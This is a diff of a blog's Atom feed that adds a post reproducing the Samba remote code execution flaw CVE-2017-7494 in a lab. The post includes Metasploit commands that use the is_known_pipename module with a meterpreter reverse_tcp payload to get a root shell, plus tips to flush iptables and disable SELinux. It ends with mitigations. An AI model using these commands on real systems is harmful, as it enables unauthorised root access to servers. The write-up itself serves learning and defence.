@@ -1,16 +1,16 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>Soleral&#39;s blog</title>
+  <title>Soleral</title>
   
   
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-01-31T06:50:44.429Z</updated>
+  <updated>2021-01-31T16:10:05.407Z</updated>
   <id>http://example.com/</id>
   
   <author>
-    <name>soleral</name>
+    <name>Soleral</name>
     
   </author>
   
@@ -21,8 +21,15 @@
     <link href="http://example.com/2021/01/31/CVE-2017-7494/"/>
     <id>http://example.com/2021/01/31/CVE-2017-7494/</id>
     <published>2021-01-31T06:46:58.000Z</published>
-    <updated>2021-01-31T06:50:44.429Z</updated>
+    <updated>2021-01-31T16:10:05.407Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="Describe"><a href="#Describe" class="headerlink" title="Describe"></a>Describe</h1><p>On May 24, 2017, samba released version 4.6.4, which fixed a serious Remote Code Execution Vulnerability, The vulnerability number is cve-2017-7494.</p><h1 id="System-affected-by-vulnerability"><a href="#System-affected-by-vulnerability" class="headerlink" title="System affected by vulnerability"></a>System affected by vulnerability</h1><p>Samba 3.5.0-4.6.4/4.5.10/4.4.14,The version after 4.6.4/4.5.10/4.4.14 has fixed the vulnerability.</p><h1 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h1><p>Download the <a href="https://archive.kernel.org/centos-vault/6.5/isos/x86_64/CentOS-6.5-x86_64-bin-DVD1to2.torrent">iso</a>.</p><h2 id="Install-samba-server"><a href="#Install-samba-server" class="headerlink" title="Install samba server"></a>Install samba server</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install samba</span><br></pre></td></tr></table></figure><h2 id="Modify-configuration-file"><a href="#Modify-configuration-file" class="headerlink" title="Modify configuration file"></a>Modify configuration file</h2><p><img src="/img/cve-2017-7494/2.png" alt="2.png" title="2"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;home&#x2F;samba</span><br></pre></td></tr></table></figure><h2 id="start-server"><a href="#start-server" class="headerlink" title="start server"></a>start server</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service smb restart</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2017-7494/1.png" alt="1.png" title="1"></p><h2 id="Then-open-Metasploit-in-Kali-Configuration-the-parameters-start-exploit"><a href="#Then-open-Metasploit-in-Kali-Configuration-the-parameters-start-exploit" class="headerlink" title="Then open Metasploit in Kali,Configuration the parameters,start exploit"></a>Then open Metasploit in Kali,Configuration the parameters,start exploit</h2><h3 id="Configuration-the-parameters"><a href="#Configuration-the-parameters" class="headerlink" title="Configuration the parameters"></a>Configuration the parameters</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search cve-2017-7494</span><br><span class="line">use exploit&#x2F;linux&#x2F;samba&#x2F;is_known_pipename</span><br><span class="line">set RHOSTS 192.168.1.110</span><br><span class="line">set PAYLOAD linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.1.111</span><br><span class="line">set TARGET 3</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2017-7494/3.png" alt="3.png" title="3"></p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><img src="/img/cve-2017-7494/4.png" alt="4.png" title="4"></p><p>Samba is executed as root by default, so the vulnerability can get root permission directly.</p><h2 id="problems"><a href="#problems" class="headerlink" title="problems"></a>problems</h2><p>When it shows :[-] 192.168.1.106:445 - Exploit failed [unreachable]: Rex::HostUnreachable The host (192.168.1.106:445) was unreachable.<br>It could be the iptables or selinux prevented the connect.<br>clear the iptables’s rules or stop iptables.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -F#clear the iptables&#39;s rules</span><br><span class="line">service stop iptables #stop iptables</span><br><span class="line">setenforce 0#close selinux</span><br></pre></td></tr></table></figure><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Modify-configuration-file-1"><a href="#Modify-configuration-file-1" class="headerlink" title="Modify configuration file"></a>Modify configuration file</h2><p>Edit profile<br>append line: nt pipe support=no</p><h2 id="Update-the-samba-server"><a href="#Update-the-samba-server" class="headerlink" title="Update the samba server"></a>Update the samba server</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;Describe&quot;&gt;&lt;a href=&quot;#Describe&quot; class=&quot;headerlink&quot; title=&quot;Describe&quot;&gt;&lt;/a&gt;Describe&lt;/h1&gt;&lt;p&gt;On May 24, 2017, samba released version 4.6.4,</summary>
+      
     
     
     
